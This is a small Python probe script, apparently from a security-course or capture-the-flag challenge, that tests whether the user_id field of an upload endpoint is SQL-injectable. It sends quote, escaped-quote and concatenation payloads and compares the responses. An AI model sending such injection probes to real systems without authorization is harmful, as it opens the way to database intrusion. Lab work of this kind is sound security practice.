# probe_userid_sqli.py — test if the POST /upload user_id (body) is SQL-injectable.
# The image passes the "trip" classifier, so any 500 now comes from the SQL layer, not the classifier.
import requests

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
MY_UID = "ea42cd39-001b-4fb5-a509-449322674687"
URI = open("paisaje_datauri.txt").read().strip()

def upload(user_id, desc="probe"):
    r = requests.post(f"{BASE}/upload",
                      json={"image": URI, "description": desc, "user_id": user_id})
    print(f"user_id={user_id!r:45} -> {r.status_code}  {r.text[:120].strip()}")
    return r

# 1) baseline: our real uuid should succeed (200)
upload(MY_UID, "baseline")

# 2) a lone quote in user_id: if it reaches an unparameterized INSERT -> 500
upload("x'", "quote")

# 3) escaped quote: if '' is accepted (200) we're inside a string literal => injectable
upload("x''", "escaped")

# 4) concat marker (sqlite/postgres string concat)
upload("x'||'y", "concat")
